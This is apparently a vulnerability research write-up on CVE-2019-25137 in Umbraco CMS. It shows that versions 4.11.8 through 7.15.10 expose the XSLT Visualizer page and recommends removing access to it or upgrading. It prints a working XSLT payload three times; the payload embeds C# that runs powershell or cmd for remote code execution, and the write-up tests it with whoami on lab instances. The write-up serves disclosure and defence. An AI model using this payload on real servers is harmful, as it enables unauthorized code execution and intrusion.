# **CVE-2019-25137 Affected Version Research** 

---

## **CVE-2019-25137 Overview**

<br>

CVE-2019-25137 is a XSLT injection vulnerability in Umbraco CMS. The vulnerability is present in the XSLT (Extensive Stylesheet Language Transformations) Visualizer webpage. The vulnerable URI for this webpage is /umbraco/developer/Xslt/xsltVisualize.aspx.

Successful exploitation of the XSLT Visualizer can result in C# code being executed on the targeted system. To exploit the vulnerability, a user requires legitimate administrator credentials to the Umbraco CMS. 

The proof of concept for CVE-2019-25137 uses the msxsl:script element. This element allows for additional programming languages to be used in XSLT transformations, such as C#.

<br>

```
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
	xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
	xmlns:msxsl="urn:schemas-microsoft-com:xslt"
	xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">
	<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = "<additional arguments>"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "<Can be powershell or cmd>"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script>
	<xsl:template match="/">
		<xsl:value-of select="csharp_user:xml()"/>
	</xsl:template>
</xsl:stylesheet>
```
<br>

The XSLT payload will attempt to execute the following C# code. 

<br>

```
string cmd = "<additional arguments>"; 
System.Diagnostics.Process proc = new System.Diagnostics.Process(); 
proc.StartInfo.FileName = "<Can be powershell or cmd>"; 
proc.StartInfo.Arguments = cmd; 
proc.StartInfo.UseShellExecute = false; 
proc.StartInfo.RedirectStandardOutput = true;  
proc.Start(); 
string output = proc.StandardOutput.ReadToEnd(); 
return output;
```

<br>

The C# code is broken down into the following statements - all definitions are documented on Microsoft's website.

| Function                                        | Overview                                                                                                                                     |
| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------|
| System.Diagnostics.Process proc                 | Provides access to local and remote processes and enables the user to start and stop local system processes, this one is called "proc".      |
| proc.StartInfo.FileName                         | Defines the name of the application the user wants to start (powershell or cmd).                                                             |
| proc.StartInfo.Arguments                        | Defines any additional variables that might be needed by FileName.                                                                           |
| proc.StartInfo.UseShellExecute                  | A value indicating whether to use the operating system shell to start the process, this is set as false as either powershell or cmd is used. |
| proc.StartInfo.RedirectStandardOutput           | A value that indicates whether the output of an application is written to the StandardOutput stream, this is set as true.                    |
| proc.Start()                                    | Starts the "proc" process resource and associates it with a Process component.                                                               |
| string output = proc.StandardOutput.ReadToEnd() | Performs synchronous read operations on "proc" and redirects it to the "output" variable.                                                      |

<br>

---

## **Umbraco Version Analysis**

Since Umbraco is an open source CMS, I obtained different installation versions from their website to determine what versions, both old and new, may still have xsltVisualize.aspx present. 

<br>

![](/images/umbraco-releases.jpg)

<br>

Analysis indicates that the xsltVisualize.aspx file exists in Umbraco CMS version 4.11.8 until version 7.15.10. This file and the whole Development folder is no longer present in versions 8.0.0 and up.

<br>

![](/images/umbraco-8.0.0.jpg)

<br>

---

## **Testing Umbraco 4.11.8**

To demonstrate that the earliest version is also vulnerable to CVE-2019-25137, I set up a test instance of Umbraco 4.11.8.

<br>

![](/images/umbraco-4.11.8-Version.jpg)

<br>

Comparing the Umbraco CMS 4.11.8 xsltVisualize.aspx with the one from Umbraco CMS Version 7.12.4 demonstrates that while there are a small amount of differences, the webpages functionality is the same.

![](/images/umbraco-diff-7.12.4-and-4.11.8.jpg)

<br>

To test the exploit, the user needs to submit the payload within the xsltSelection field.

<br>

![](/images/hidden.jpg)

<br>

Using the payload provided before, I was able to achieve remote code execution, indicating that this version is also vulnerable. Image below demonstrates whoami being run. 

```
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
	xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
	xmlns:msxsl="urn:schemas-microsoft-com:xslt"
	xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">
	<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = "whoami"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "powershell"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script>
	<xsl:template match="/">
		<xsl:value-of select="csharp_user:xml()"/>
	</xsl:template>
</xsl:stylesheet>
```

<br>

![](/images/whoami.jpg)

---

<br>

## **Testing Umbraco 7.15.10**

To demonstrate that the most recent version of Umbraco with xsltVisualize.aspx is also vulnerable, I set up a test instance of Umbraco 7.15.10.

![](/images/umbraco-7.10.15-version.jpg)

<br>

Comparing the Umbraco CMS 7.15.10 xsltVisualize.aspx with the one from Umbraco CMS Version 7.12.4 demonstrates that they are the same.
![](/images/umbraco-diff-7.12.4-and-7.15.10.jpg)

<br>

Navigating to the /umbraco/developer/Xslt/xsltVisualize.aspx URI indicates that the file is indeed present.
![](/images/umbraco-7.10.15-xlst.jpg)

<br>

Using the same payload provided before, I was able to achieve remote code execution again, indicating that this version is also vulnerable. Image below demonstrates whoami being run.

```
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
	xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
	xmlns:msxsl="urn:schemas-microsoft-com:xslt"
	xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">
	<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = "whoami"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "powershell"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script>
	<xsl:template match="/">
		<xsl:value-of select="csharp_user:xml()"/>
	</xsl:template>
</xsl:stylesheet>
```

![](/images/umbraco-7.10.15-whoami.jpg)

<br>


## **Summary**

<br>

These examples demonstrates that CVE-2019-25137 is present on Umbraco versions separate from 7.12.4. All versions between 4.11.8 and 7.15.10 contain the vulnerable webpage and therefore should be included in the CVE update. CVE-2019-25137 can be mitigated by removing access to the xsltVisualize.aspx file or updating to the most recent version of Umbraco.

---

<br>

### **References**
Original CVE - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-25137

Umbraco Release Date- https://our.umbraco.com/download/releases/774

Umbraco Versions - https://our.umbraco.com/download/releases

XSLT Definition - https://en.wikipedia.org/wiki/XSLT

Payload Used - https://github.com/noraj/Umbraco-RCE
